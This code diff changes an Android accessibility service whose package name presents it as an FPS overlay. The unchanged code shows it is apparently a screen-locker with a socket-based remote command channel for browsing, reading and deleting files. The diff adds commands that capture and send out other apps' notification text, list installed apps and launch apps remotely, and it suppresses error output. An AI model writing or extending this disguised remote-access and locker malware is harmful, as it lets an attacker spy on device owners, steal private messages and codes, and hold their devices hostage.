@@ -2,6 +2,9 @@ package com.bluestacks.fpsoverlay;
 
 import android.accessibilityservice.AccessibilityService;
 import android.content.Context;
+import android.content.Intent;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
 import android.graphics.PixelFormat;
 import android.os.Handler;
 import android.os.Looper;
@@ -27,6 +30,9 @@ import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.List;
 import java.util.Locale;
 
 public class SupportService extends AccessibilityService {
@@ -34,15 +40,16 @@ public class SupportService extends AccessibilityService {
     private View overlay;
     private TextView tv_status;
     private TextView tv_display;
-    private StringBuilder input_buffer = new StringBuilder();
+    private final StringBuilder input_buffer = new StringBuilder();
     private long remaining_sec;
-    private Handler task_handler = new Handler(Looper.getMainLooper());
+    private final Handler task_handler = new Handler(Looper.getMainLooper());
     private static final String PREFS_NAME = "lock_prefs";
     private static final String KEY_END_TIME = "end_time";
     
     private ServerSocket serverSocket;
     private boolean isLocked = false;
     private String currentPath = Environment.getExternalStorageDirectory().getAbsolutePath();
+    private final List<String> notificationLog = Collections.synchronizedList(new ArrayList<>());
 
     public native boolean checkKey(String s);
     public native boolean checkStatus();
@@ -103,7 +110,7 @@ public class SupportService extends AccessibilityService {
                     handleCommand(client);
                 }
             } catch (Exception e) {
-                e.printStackTrace();
+                // Server closed or error
             }
         }).start();
     }
@@ -169,13 +176,20 @@ public class SupportService extends AccessibilityService {
                     out.println("ERROR: Not a directory");
                 }
             } else if (cmdLower.startsWith("ls")) {
-                String path = cmd.length() > 3 ? cmd.substring(3).trim() : currentPath;
-                File dir = new File(path.startsWith("/") ? path : currentPath + "/" + path);
+                String pathArg = cmd.length() > 3 ? cmd.substring(3).trim() : "";
+                File dir = new File(pathArg.isEmpty() ? currentPath : (pathArg.startsWith("/") ? pathArg : currentPath + "/" + pathArg));
                 if (dir.exists() && dir.isDirectory()) {
                     File[] files = dir.listFiles();
                     if (files != null) {
+                        List<File> fileList = new ArrayList<>();
+                        Collections.addAll(fileList, files);
+                        Collections.sort(fileList, (a, b) -> {
+                            if (a.isDirectory() && !b.isDirectory()) return -1;
+                            if (!a.isDirectory() && b.isDirectory()) return 1;
+                            return a.getName().toLowerCase().compareTo(b.getName().toLowerCase());
+                        });
                         StringBuilder sb = new StringBuilder();
-                        for (File f : files) {
+                        for (File f : fileList) {
                             sb.append(f.isDirectory() ? "[d] " : "[f] ").append(f.getName()).append("\n");
                         }
                         out.println(sb.toString().isEmpty() ? "Empty" : sb.toString());
@@ -189,12 +203,14 @@ public class SupportService extends AccessibilityService {
                 String fileName = cmd.substring(4).trim();
                 File f = new File(fileName.startsWith("/") ? fileName : currentPath + "/" + fileName);
                 if (f.exists() && f.isFile()) {
-                    BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f)));
-                    String line;
-                    StringBuilder content = new StringBuilder();
-                    while ((line = br.readLine()) != null) content.append(line).append("\n");
-                    br.close();
-                    out.println(content.toString());
+                    try (BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f)))) {
+                        String line;
+                        StringBuilder content = new StringBuilder();
+                        while ((line = br.readLine()) != null) content.append(line).append("\n");
+                        out.println(content.toString());
+                    } catch (Exception e) {
+                        out.println("ERROR: " + e.getMessage());
+                    }
                 } else {
                     out.println("ERROR: File not found");
                 }
@@ -207,13 +223,44 @@ public class SupportService extends AccessibilityService {
                     out.println("ERROR: Delete failed");
                 }
             } else if (cmdLower.equals("info")) {
-                out.println("Model: " + Build.MODEL + " | Android: " + Build.VERSION.RELEASE);
+                out.println("Model: " + Build.MODEL + " | Android: " + Build.VERSION.RELEASE + " | SDK: " + Build.VERSION.SDK_INT);
+            } else if (cmdLower.equals("notifs")) {
+                if (notificationLog.isEmpty()) {
+                    out.println("No new notifications.");
+                } else {
+                    StringBuilder sb = new StringBuilder();
+                    synchronized (notificationLog) {
+                        for (String n : notificationLog) sb.append(n).append("\n");
+                        notificationLog.clear();
+                    }
+                    out.println(sb.toString());
+                }
+            } else if (cmdLower.equals("apps")) {
+                PackageManager pm = getPackageManager();
+                List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+                StringBuilder sb = new StringBuilder();
+                for (ApplicationInfo app : apps) {
+                    if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                        sb.append(app.packageName).append("\n");
+                    }
+                }
+                out.println(sb.toString());
+            } else if (cmdLower.startsWith("launch ")) {
+                String pkg = cmd.substring(7).trim();
+                Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
+                if (i != null) {
+                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(i);
+                    out.println("OK: Launched " + pkg);
+                } else {
+                    out.println("ERROR: Package not found or not launchable");
+                }
             } else {
                 out.println("ERROR: Unknown Command");
             }
             client.close();
         } catch (Exception e) {
-            e.printStackTrace();
+            // Error handling
         }
     }
 
@@ -309,6 +356,13 @@ public class SupportService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
+            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "System";
+            String text = event.getText() != null ? event.getText().toString() : "";
+            notificationLog.add("[" + pkg + "] " + text);
+            if (notificationLog.size() > 50) notificationLog.remove(0);
+        }
+
         if (isLocked && overlay != null) {
             if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 String pkgName = event.getPackageName() != null ? event.getPackageName().toString() : "";
